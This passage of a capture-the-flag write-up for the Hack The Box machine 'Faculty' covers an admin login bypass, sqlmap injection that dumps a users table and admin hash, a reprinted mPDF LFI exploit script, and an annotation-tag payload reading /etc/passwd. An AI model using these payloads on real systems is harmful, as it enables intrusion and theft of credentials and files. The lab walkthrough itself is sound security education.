<span class="o">[</span><span class="m">09</span>:15:04<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">    </span>5KB<span class="w"> </span>-<span class="w"> </span>/login.php
<span class="o">[</span><span class="m">09</span>:15:10<span class="o">]</span><span class="w"> </span><span class="m">500</span><span class="w"> </span>-<span class="w">    </span>0B<span class="w">  </span>-<span class="w"> </span>/test.php

Task<span class="w"> </span>Completed
</pre></div>
</div>
</section>
<section id="login-bypass">
<h2>Login bypass<a class="headerlink" href="#login-bypass" title="Permalink to this heading">#</a></h2>
<p>The main login page just asks for a Faculty ID number, that may be vulerable to a simple IDOR.<br />
But there’s a separate page on /admin/login.php, this one has a basic login bypass.</p>
</section>
<section id="enum-as-admin">
<h2>Enum as admin<a class="headerlink" href="#enum-as-admin" title="Permalink to this heading">#</a></h2>
<p>Now that we are admin on the site, we can start enumarating again.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Cookie</span><span class="p">:</span> <span class="n">PHPSESSID</span><span class="o">=</span><span class="n">o7987bp4js9jm58hh523hm2i9n</span>
</pre></div>
</div>
<p>The faculty list page gives us all the existing faculty ID and lets us create new ones, so no need to atempt the IDOR anymore.
<img alt="users.png" src="../../../../_images/users.png" /></p>
<p>There are 5 pages with the following forms :</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>- course list   - new course form  - ?action=save_course   - POST - multipart/form-data
- subject list  - new subject form - ?action=save_subject  - POST - multipart/form-data 
- faculty list  - new fac id       - ?action=save_faculty  - POST - application/x-www-form-urlencoded 
- schedule      - new sched entry  - ?action=save_schedule - POST - multipart/form-data 
- users         - the new user button is useless afaict
</pre></div>
</div>
</section>
<section id="sqli">
<h2>SQLi<a class="headerlink" href="#sqli" title="Permalink to this heading">#</a></h2>
<p>testing them all for sqli, starting with the only urlencoded one, and it’s already a win.</p>
<div class="highlight-http notranslate"><div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/admin/ajax.php?action=save_faculty</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">faculty.htb</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">*/*</span>
<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded; charset=UTF-8</span>
<span class="na">X-Requested-With</span><span class="o">:</span> <span class="l">XMLHttpRequest</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">107</span>
<span class="na">Origin</span><span class="o">:</span> <span class="l">http://faculty.htb</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Referer</span><span class="o">:</span> <span class="l">http://faculty.htb/admin/index.php?page=faculty</span>
<span class="na">Cookie</span><span class="o">:</span> <span class="l">PHPSESSID=o7987bp4js9jm58hh523hm2i9n</span>

<span class="nt">id</span><span class="o">=</span><span class="p">&amp;</span><span class="nt">id_no</span><span class="o">=</span><span class="s">asdf</span><span class="p">&amp;</span><span class="nt">lastname</span><span class="o">=</span><span class="s">asdfa</span><span class="p">&amp;</span><span class="nt">firstname</span><span class="o">=</span><span class="s">asdf</span><span class="p">&amp;</span><span class="nt">middlename</span><span class="o">=</span><span class="s">asdf</span><span class="p">&amp;</span><span class="nt">email</span><span class="o">=</span><span class="s">sdfa</span><span class="p">&amp;</span><span class="nt">contact</span><span class="o">=</span><span class="s">asdf</span><span class="p">&amp;</span><span class="nt">gender</span><span class="o">=</span><span class="s">Male</span><span class="p">&amp;</span><span class="nt">address</span><span class="o">=</span><span class="s">sd</span>
</pre></div>
</div>
<p>Then SQLi to leak a bunch of things from the db, it is possible to get the administrator’s hash but I didn’t succeed in cracking it though</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>sqlmap<span class="w"> </span>-r<span class="w"> </span>save_faculty.req<span class="w"> </span>--batch<span class="w"> </span>--threads<span class="w"> </span><span class="m">10</span><span class="w"> </span>--users
sqlmap<span class="w"> </span>-r<span class="w"> </span>save_faculty.req<span class="w"> </span>--batch<span class="w"> </span>--threads<span class="w"> </span><span class="m">10</span><span class="w"> </span>--dbs
sqlmap<span class="w"> </span>-r<span class="w"> </span>save_faculty.req<span class="w"> </span>--batch<span class="w"> </span>--threads<span class="w"> </span><span class="m">10</span><span class="w"> </span>-D<span class="w"> </span>scheduling_db<span class="w"> </span>--tables
sqlmap<span class="w"> </span>-r<span class="w"> </span>save_faculty.req<span class="w"> </span>--batch<span class="w"> </span>--threads<span class="w"> </span><span class="m">10</span><span class="w"> </span>-D<span class="w"> </span>scheduling_db<span class="w"> </span>-T<span class="w"> </span>users<span class="w"> </span>--dump
+----+---------------+------+----------------------------------+----------+
<span class="p">|</span><span class="w"> </span>id<span class="w"> </span><span class="p">|</span><span class="w"> </span>name<span class="w">          </span><span class="p">|</span><span class="w"> </span><span class="nb">type</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>password<span class="w">                         </span><span class="p">|</span><span class="w"> </span>username<span class="w"> </span><span class="p">|</span>
+----+---------------+------+----------------------------------+----------+
<span class="p">|</span><span class="w"> </span><span class="m">1</span><span class="w">  </span><span class="p">|</span><span class="w"> </span>Administrator<span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="m">1</span><span class="w">    </span><span class="p">|</span><span class="w"> </span>1fecbe762af147c1176a0fc2c722a345<span class="w"> </span><span class="p">|</span><span class="w"> </span>admin<span class="w">    </span><span class="p">|</span>
+----+---------------+------+----------------------------------+----------+
</pre></div>
</div>
<p>I’m still curious to see if the multipart/form-data ones are also injectable</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>cat<span class="w"> </span>save_course.req
POST<span class="w"> </span>/admin/ajax.php?action<span class="o">=</span>save_course<span class="w"> </span>HTTP/1.1
Host:<span class="w"> </span>faculty.htb
User-Agent:<span class="w"> </span>Mozilla/5.0<span class="w"> </span><span class="o">(</span>X11<span class="p">;</span><span class="w"> </span>Linux<span class="w"> </span>aarch64<span class="p">;</span><span class="w"> </span>rv:102.0<span class="o">)</span><span class="w"> </span>Gecko/20100101<span class="w"> </span>Firefox/102.0
Accept:<span class="w"> </span>*/*
Accept-Language:<span class="w"> </span>en-US,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span><span class="m">0</span>.5
Accept-Encoding:<span class="w"> </span>gzip,<span class="w"> </span>deflate
X-Requested-With:<span class="w"> </span>XMLHttpRequest
Content-Type:<span class="w"> </span>multipart/form-data<span class="p">;</span><span class="w"> </span><span class="nv">boundary</span><span class="o">=</span>---------------------------365414256232201372978481193
Content-Length:<span class="w"> </span><span class="m">396</span>
Origin:<span class="w"> </span>http://faculty.htb
Connection:<span class="w"> </span>close
Referer:<span class="w"> </span>http://faculty.htb/admin/index.php?page<span class="o">=</span>courses
Cookie:<span class="w"> </span><span class="nv">PHPSESSID</span><span class="o">=</span>o7987bp4js9jm58hh523hm2i9n

-----------------------------365414256232201372978481193
Content-Disposition:<span class="w"> </span>form-data<span class="p">;</span><span class="w"> </span><span class="nv">name</span><span class="o">=</span><span class="s2">&quot;id&quot;</span>


-----------------------------365414256232201372978481193
Content-Disposition:<span class="w"> </span>form-data<span class="p">;</span><span class="w"> </span><span class="nv">name</span><span class="o">=</span><span class="s2">&quot;course&quot;</span>

asdf
-----------------------------365414256232201372978481193
Content-Disposition:<span class="w"> </span>form-data<span class="p">;</span><span class="w"> </span><span class="nv">name</span><span class="o">=</span><span class="s2">&quot;description&quot;</span>

asdf
-----------------------------365414256232201372978481193--
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>sqlmap<span class="w"> </span>-r<span class="w"> </span>save_course.req<span class="w"> </span>--batch<span class="w"> </span>--threads<span class="w"> </span><span class="m">10</span><span class="w"> </span>--dbms<span class="w"> </span>mysql<span class="w"> </span>--risk<span class="w"> </span><span class="m">3</span><span class="w"> </span>--level<span class="w"> </span><span class="m">5</span>
</pre></div>
</div>
<p>looks like it isn’t, at leaast for this <code class="docutils literal notranslate"><span class="pre">save_course</span></code> one, lets move on anyways.</p>
</section>
<section id="exploring-potential-exploits-for-mpdf">
<h2>Exploring potential exploits for mPDF<a class="headerlink" href="#exploring-potential-exploits-for-mpdf" title="Permalink to this heading">#</a></h2>
<p>As admin some of the pages also have a button to generate pdfs on the fly, when you hit the button it sends a b64 encoded payload of whatever data is on the page.</p>
<p>That data is processed by mPDF on the serverside, and we receive back a 200 OK with the name of the generated pdf in the body, then the client side goes to <code class="docutils literal notranslate"><span class="pre">/mdpf/tmp/&lt;name&gt;.pdf</span></code></p>
<p>Doing some basic forensics on the pdfs, it looks like they’re generated with mPDF version 6.0.</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>file<span class="w"> </span>OK3aeYPblHAfzdXUq216o9BTMn.pdf
OK3aeYPblHAfzdXUq216o9BTMn.pdf:<span class="w"> </span>PDF<span class="w"> </span>document,<span class="w"> </span>version<span class="w"> </span><span class="m">1</span>.4,<span class="w"> </span><span class="m">1</span><span class="w"> </span>pages

exiftool<span class="w"> </span>OK3aeYPblHAfzdXUq216o9BTMn.pdf
ExifTool<span class="w"> </span>Version<span class="w"> </span>Number<span class="w">         </span>:<span class="w"> </span><span class="m">12</span>.44
File<span class="w"> </span>Name<span class="w">                       </span>:<span class="w"> </span>OK3aeYPblHAfzdXUq216o9BTMn.pdf
Directory<span class="w">                       </span>:<span class="w"> </span>.
File<span class="w"> </span>Size<span class="w">                       </span>:<span class="w"> </span><span class="m">1750</span><span class="w"> </span>bytes
File<span class="w"> </span>Modification<span class="w"> </span>Date/Time<span class="w">     </span>:<span class="w"> </span><span class="m">2022</span>:10:16<span class="w"> </span><span class="m">10</span>:22:00+01:00
File<span class="w"> </span>Access<span class="w"> </span>Date/Time<span class="w">           </span>:<span class="w"> </span><span class="m">2022</span>:10:16<span class="w"> </span><span class="m">10</span>:22:10+01:00
File<span class="w"> </span>Inode<span class="w"> </span>Change<span class="w"> </span>Date/Time<span class="w">     </span>:<span class="w"> </span><span class="m">2022</span>:10:16<span class="w"> </span><span class="m">10</span>:22:00+01:00
File<span class="w"> </span>Permissions<span class="w">                </span>:<span class="w"> </span>-rw-r--r--
File<span class="w"> </span>Type<span class="w">                       </span>:<span class="w"> </span>PDF
File<span class="w"> </span>Type<span class="w"> </span>Extension<span class="w">             </span>:<span class="w"> </span>pdf
MIME<span class="w"> </span>Type<span class="w">                       </span>:<span class="w"> </span>application/pdf
PDF<span class="w"> </span>Version<span class="w">                     </span>:<span class="w"> </span><span class="m">1</span>.4
Linearized<span class="w">                      </span>:<span class="w"> </span>No
Page<span class="w"> </span>Count<span class="w">                      </span>:<span class="w"> </span><span class="m">1</span>
Page<span class="w"> </span>Layout<span class="w">                     </span>:<span class="w"> </span>OneColumn
Producer<span class="w">                        </span>:<span class="w"> </span>mPDF<span class="w"> </span><span class="m">6</span>.0
Create<span class="w"> </span>Date<span class="w">                     </span>:<span class="w"> </span><span class="m">2022</span>:10:16<span class="w"> </span><span class="m">10</span>:20:27+01:00
Modify<span class="w"> </span>Date<span class="w">                     </span>:<span class="w"> </span><span class="m">2022</span>:10:16<span class="w"> </span><span class="m">10</span>:20:27+01:00
</pre></div>
</div>
<p>looking at searchsploit there seems to be only one relevant exploit:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>mPDF
-----------------------------------------------------------------------<span class="w"> </span>---------------------------------
<span class="w"> </span>Exploit<span class="w"> </span>Title<span class="w">                                                         </span><span class="p">|</span><span class="w">  </span>Path
-----------------------------------------------------------------------<span class="w"> </span>---------------------------------
dompdf<span class="w"> </span><span class="m">0</span>.6.0<span class="w"> </span>-<span class="w"> </span><span class="s1">&#39;dompdf.php?read&#39;</span><span class="w"> </span>Arbitrary<span class="w"> </span>File<span class="w"> </span>Read<span class="w">                   </span><span class="p">|</span><span class="w"> </span>php/webapps/33004.txt
dompdf<span class="w"> </span><span class="m">0</span>.6.0<span class="w"> </span>beta1<span class="w"> </span>-<span class="w"> </span>Remote<span class="w"> </span>File<span class="w"> </span>Inclusion<span class="w">                             </span><span class="p">|</span><span class="w"> </span>php/webapps/14851.txt
mPDF<span class="w"> </span><span class="m">5</span>.3<span class="w"> </span>-<span class="w"> </span>File<span class="w"> </span>Disclosure<span class="w">                                             </span><span class="p">|</span><span class="w"> </span>php/webapps/18248.pl
mPDF<span class="w"> </span><span class="m">7</span>.0<span class="w"> </span>-<span class="w"> </span>Local<span class="w"> </span>File<span class="w"> </span>Inclusion<span class="w">                                        </span><span class="p">|</span><span class="w"> </span>php/webapps/50995.py
SlimPDF<span class="w"> </span>Reader<span class="w"> </span>-<span class="w"> </span>Denial<span class="w"> </span>of<span class="w"> </span>Service<span class="w"> </span><span class="o">(</span>PoC<span class="o">)</span><span class="w">                               </span><span class="p">|</span><span class="w"> </span>windows/dos/17274.txt
Slimpdf<span class="w"> </span>Reader<span class="w"> </span><span class="m">1</span>.0<span class="w"> </span>-<span class="w"> </span>Memory<span class="w"> </span>Corruption<span class="w">                                 </span><span class="p">|</span><span class="w"> </span>windows/dos/19391.py
TYPO3<span class="w"> </span>Extension<span class="w"> </span>ke<span class="w"> </span>DomPDF<span class="w"> </span>-<span class="w"> </span>Remote<span class="w"> </span>Code<span class="w"> </span>Execution<span class="w">                      </span><span class="p">|</span><span class="w"> </span>php/webapps/35443.txt
-----------------------------------------------------------------------<span class="w"> </span>---------------------------------
Shellcodes:<span class="w"> </span>No<span class="w"> </span>Results
</pre></div>
</div>
<p>Trying that LFI script:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>searchsploit<span class="w"> </span>-m<span class="w"> </span>php/webapps/50995.py
mv<span class="w"> </span><span class="m">50995</span>.py<span class="w"> </span>lfi.py
</pre></div>
</div>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="c1"># Exploit Title: mPDF 7.0 - Local File Inclusion</span>
<span class="c1"># Google Dork: N/A</span>
<span class="c1"># Date: 2022-07-23</span>
<span class="c1"># Exploit Author: Musyoka Ian</span>
<span class="c1"># Vendor Homepage: https://mpdf.github.io/</span>
<span class="c1"># Software Link: https://mpdf.github.io/</span>
<span class="c1"># Version: CuteNews</span>
<span class="c1"># Tested on: Ubuntu 20.04, mPDF 7.0.x</span>
<span class="c1"># CVE: N/A</span>

<span class="c1">#!/usr/bin/env python3</span>

<span class="kn">from</span><span class="w"> </span><span class="nn">urllib.parse</span><span class="w"> </span><span class="kn">import</span> <span class="n">quote</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">cmd</span><span class="w"> </span><span class="kn">import</span> <span class="n">Cmd</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">base64</span><span class="w"> </span><span class="kn">import</span> <span class="n">b64encode</span>

<span class="k">class</span><span class="w"> </span><span class="nc">Terminal</span><span class="p">(</span><span class="n">Cmd</span><span class="p">):</span>
    <span class="n">prompt</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">File &gt;&gt; &quot;</span>
    <span class="k">def</span><span class="w"> </span><span class="nf">default</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">args</span><span class="p">):</span>
        <span class="n">payload_gen</span><span class="p">(</span><span class="n">args</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">banner</span><span class="p">():</span>
    <span class="n">banner</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;                          _____  _____  ______   ______ ___  __   __                  _       _ _</span>
<span class="s2">                         |  __ \|  __ \|  ____| |____  / _ \ \ \ / /                 | |     (_) |</span>
<span class="s2">               _ __ ___  | |__) | |  | | |__        / / | | | \ V /    _____  ___ __ | | ___  _| |_</span>
<span class="s2">               | &#39;_ ` _ \|  ___/| |  | |  __|      / /| | | |  &gt; &lt;    / _ \ \/ / &#39;_ \| |/ _ \| | __|</span>
<span class="s2">               | | | | | | |    | |__| | |        / / | |_| | / . \  |  __/&gt;  &lt;| |_) | | (_) | | |_</span>
<span class="s2">               |_| |_| |_|_|    |_____/|_|       /_/ (_)___(_)_/ \_\  \___/_/\_\ .__/|_|\___/|_|\__|</span>
<span class="s2">                                                                               | |</span>
<span class="s2">                                                                               |_|   &quot;&quot;&quot;</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">banner</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">payload_gen</span><span class="p">(</span><span class="n">fname</span><span class="p">):</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;&lt;annotation file=&quot;</span><span class="si">{</span><span class="n">fname</span><span class="si">}</span><span class="s1">&quot; content=&quot;</span><span class="si">{</span><span class="n">fname</span><span class="si">}</span><span class="s1">&quot; icon=&quot;Graph&quot; title=&quot;Attached File: </span><span class="si">{</span><span class="n">fname</span><span class="si">}</span><span class="s1">&quot; pos-x=&quot;195&quot; /&gt;&#39;</span>
    <span class="n">encoded_payload</span> <span class="o">=</span> <span class="n">quote</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] Replace the content with the payload below&quot;</span><span class="p">)</span>

    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Url encoded payload:</span><span class="se">\n</span><span class="si">{</span><span class="n">encoded_payload</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="n">base64enc</span> <span class="o">=</span> <span class="n">b64encode</span><span class="p">(</span><span class="n">encoded_payload</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Base64 encoded payload:</span><span class="se">\n</span><span class="si">{</span><span class="n">base64enc</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="p">(</span><span class="s2">&quot;__main__&quot;</span><span class="p">):</span>
    <span class="n">banner</span><span class="p">()</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Enter Filename eg. /etc/passwd&quot;</span><span class="p">)</span>
    <span class="n">terminal</span><span class="o">=</span> <span class="n">Terminal</span><span class="p">()</span>
    <span class="n">terminal</span><span class="o">.</span><span class="n">cmdloop</span><span class="p">()</span>
</pre></div>
</div>
<p>this seemed promissing as it’s generating b64 payloads to send to mPDF, trying to replace the payload in burp and see if that returns anything interesting, it returns an empty pdf.</p>
<p>I tried to look at it with strings, but I don’t think the files are actually beeing included in it.</p>
<p>Googling further, I found a buch more things, and tried a bunch of CVEs below, they should all be ongoing as they’ve all been patched way after 6.0.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">CVE</span><span class="o">-</span><span class="mi">2019</span><span class="o">-</span><span class="mi">1000005</span> <span class="o">-</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">mpdf</span><span class="o">/</span><span class="n">mpdf</span><span class="o">/</span><span class="n">issues</span><span class="o">/</span><span class="mi">949</span>   <span class="o">-</span> <span class="n">PHP</span> <span class="n">deserialization</span> <span class="n">through</span> <span class="n">phar</span><span class="p">:</span><span class="o">//</span> <span class="n">wrapper</span>
<span class="n">CVE</span><span class="o">-</span><span class="mi">2011</span><span class="o">-</span><span class="mi">5219</span>    <span class="o">-</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">exploit</span><span class="o">-</span><span class="n">db</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">exploits</span><span class="o">/</span><span class="mi">18248</span> <span class="o">-</span> <span class="n">File</span> <span class="n">Disclosure</span> <span class="n">perl</span> <span class="n">script</span> 
<span class="n">CVE</span><span class="o">-</span><span class="mi">2018</span><span class="o">-</span><span class="mi">19047</span>   <span class="o">-</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">mpdf</span><span class="o">/</span><span class="n">mpdf</span><span class="o">/</span><span class="n">issues</span><span class="o">/</span><span class="mi">867</span>   <span class="o">-</span> <span class="n">SSRF</span> <span class="o">-</span> <span class="n">vulnerable</span>
<span class="n">No</span> <span class="n">CVE</span>           <span class="o">-</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">mpdf</span><span class="o">/</span><span class="n">mpdf</span><span class="o">/</span><span class="n">issues</span><span class="o">/</span><span class="mi">356</span>   <span class="o">-</span> <span class="n">annotation</span> <span class="n">tags</span>
</pre></div>
</div>
<p>I managed to make the SSRF work, but not sure what to use it against.</p>
<p>Looking into the deserialization, looks like the phar/jpeg needs to be hosted localy anyways, and we haven’t got that option yet.</p>
<p>That annotation tag thing was super hard to find, but it works, let look at it closer</p>
</section>
<section id="circling-back-to-the-mpdf-lfi">
<h2>Circling back to the mPDF LFI<a class="headerlink" href="#circling-back-to-the-mpdf-lfi" title="Permalink to this heading">#</a></h2>
<p>So according to this github issue: <a class="reference external" href="https://github.com/mpdf/mpdf/issues/356">https://github.com/mpdf/mpdf/issues/356</a></p>
<p>We could abuse the html tags to have mPDF include system files in the pdf, like this:</p>
<div class="highlight-html notranslate"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">annotation</span> <span class="na">file</span><span class="o">=</span><span class="s">&quot;/etc/passwd&quot;</span> <span class="na">content</span><span class="o">=</span><span class="s">&quot;/etc/passwd&quot;</span>  <span class="na">icon</span><span class="o">=</span><span class="s">&quot;Graph&quot;</span> <span class="na">title</span><span class="o">=</span><span class="s">&quot;Attached File: /etc/passwd&quot;</span> <span class="na">pos-x</span><span class="o">=</span><span class="s">&quot;195&quot;</span> <span class="p">/&gt;</span>
</pre></div>
</div>
<p>Which means that we would we need to inject that in the payload somehow, so lets try to get it decoded furthter.</p>
<p>Probing around with cyberchef we can see that it’s urlencoded twice, and then base64 on top<br />
<img alt="cyber-chef.png" src="../../../../_images/cyber-chef.png" /></p>
<p>So we get something like that</p>
<div class="highlight-html notranslate"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;top&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>faculty.htb<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>Subjects<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;&lt;</span><span class="nt">table</span><span class="p">&gt;</span>    <span class="p">&lt;</span><span class="nt">thead</span><span class="p">&gt;</span>        <span class="p">&lt;</span><span class="nt">tr</span><span class="p">&gt;</span>            <span class="p">&lt;</span><span class="nt">th</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;text-center&quot;</span><span class="p">&gt;</span>#<span class="p">&lt;/</span><span class="nt">th</span><span class="p">&gt;</span>            <span class="p">&lt;</span><span class="nt">th</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;text-left&quot;</span><span class="p">&gt;</span>Subject<span class="p">&lt;/</span><span class="nt">th</span><span class="p">&gt;</span>            <span class="p">&lt;</span><span class="nt">th</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;text-left&quot;</span><span class="p">&gt;</span>Description<span class="p">&lt;/</span><span class="nt">th</span><span class="p">&gt;</span>            <span class="p">&lt;/</span><span class="nt">tr</span><span class="p">&gt;&lt;/</span><span class="nt">thead</span><span class="p">&gt;&lt;</span><span class="nt">tbody</span><span class="p">&gt;&lt;</span><span class="nt">tr</span><span class="p">&gt;&lt;</span><span class="nt">td</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;text-center&quot;</span><span class="p">&gt;</span>1<span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;&lt;</span><span class="nt">td</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;text-center&quot;</span><span class="p">&gt;&lt;</span><span class="nt">b</span><span class="p">&gt;</span>DBMS<span class="p">&lt;/</span><span class="nt">b</span><span class="p">&gt;&lt;/</span><span class="nt">td</span><span class="p">&gt;&lt;</span><span class="nt">td</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;text-center&quot;</span><span class="p">&gt;&lt;</span><span class="nt">small</span><span class="p">&gt;&lt;</span><span class="nt">b</span><span class="p">&gt;</span>Database Management System<span class="p">&lt;/</span><span class="nt">b</span><span class="p">&gt;&lt;/</span><span class="nt">small</span><span class="p">&gt;&lt;/</span><span class="nt">td</span><span class="p">&gt;&lt;/</span><span class="nt">tr</span><span class="p">&gt;&lt;</span><span class="nt">tr</span><span class="p">&gt;&lt;</span><span class="nt">td</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;text-center&quot;</span><span class="p">&gt;</span>2<span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;&lt;</span><span class="nt">td</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;text-center&quot;</span><span class="p">&gt;&lt;</span><span class="nt">b</span><span class="p">&gt;</span>Mathematics<span class="p">&lt;/</span><span class="nt">b</span><span class="p">&gt;&lt;/</span><span class="nt">td</span><span class="p">&gt;&lt;</span><span class="nt">td</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;text-center&quot;</span><span class="p">&gt;&lt;</span><span class="nt">small</span><span class="p">&gt;&lt;</span><span class="nt">b</span><span class="p">&gt;</span>Mathematics<span class="p">&lt;/</span><span class="nt">b</span><span class="p">&gt;&lt;/</span><span class="nt">small</span><span class="p">&gt;&lt;/</span><span class="nt">td</span><span class="p">&gt;&lt;/</span><span class="nt">tr</span><span class="p">&gt;&lt;</span><span class="nt">tr</span><span class="p">&gt;&lt;</span><span class="nt">td</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;text-center&quot;</span><span class="p">&gt;</span>3<span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;&lt;</span><span class="nt">td</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;text-center&quot;</span><span class="p">&gt;&lt;</span><span class="nt">b</span><span class="p">&gt;</span>English<span class="p">&lt;/</span><span class="nt">b</span><span class="p">&gt;&lt;/</span><span class="nt">td</span><span class="p">&gt;&lt;</span><span class="nt">td</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;text-center&quot;</span><span class="p">&gt;&lt;</span><span class="nt">small</span><span class="p">&gt;&lt;</span><span class="nt">b</span><span class="p">&gt;</span>English<span class="p">&lt;/</span><span class="nt">b</span><span class="p">&gt;&lt;/</span><span class="nt">small</span><span class="p">&gt;&lt;/</span><span class="nt">td</span><span class="p">&gt;&lt;/</span><span class="nt">tr</span><span class="p">&gt;&lt;</span><span class="nt">tr</span><span class="p">&gt;&lt;</span><span class="nt">td</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;text-center&quot;</span><span class="p">&gt;</span>4<span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;&lt;</span><span class="nt">td</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;text-center&quot;</span><span class="p">&gt;&lt;</span><span class="nt">b</span><span class="p">&gt;</span>Computer Hardware<span class="p">&lt;/</span><span class="nt">b</span><span class="p">&gt;&lt;/</span><span class="nt">td</span><span class="p">&gt;&lt;</span><span class="nt">td</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;text-center&quot;</span><span class="p">&gt;&lt;</span><span class="nt">small</span><span class="p">&gt;&lt;</span><span class="nt">b</span><span class="p">&gt;</span>Computer Hardware<span class="p">&lt;/</span><span class="nt">b</span><span class="p">&gt;&lt;/</span><span class="nt">small</span><span class="p">&gt;&lt;/</span><span class="nt">td</span><span class="p">&gt;&lt;/</span><span class="nt">tr</span><span class="p">&gt;&lt;</span><span class="nt">tr</span><span class="p">&gt;&lt;</span><span class="nt">td</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;text-center&quot;</span><span class="p">&gt;</span>5<span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;&lt;</span><span class="nt">td</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;text-center&quot;</span><span class="p">&gt;&lt;</span><span class="nt">b</span><span class="p">&gt;</span>History<span class="p">&lt;/</span><span class="nt">b</span><span class="p">&gt;&lt;/</span><span class="nt">td</span><span class="p">&gt;&lt;</span><span class="nt">td</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;text-center&quot;</span><span class="p">&gt;&lt;</span><span class="nt">small</span><span class="p">&gt;&lt;</span><span class="nt">b</span><span class="p">&gt;</span>History<span class="p">&lt;/</span><span class="nt">b</span><span class="p">&gt;&lt;/</span><span class="nt">small</span><span class="p">&gt;&lt;/</span><span class="nt">td</span><span class="p">&gt;&lt;/</span><span class="nt">tr</span><span class="p">&gt;&lt;/</span><span class="nt">tboby</span><span class="p">&gt;&lt;/</span><span class="nt">table</span><span class="p">&gt;</span>
</pre></div>
</div>
<p>formated in a more readable fashion</p>
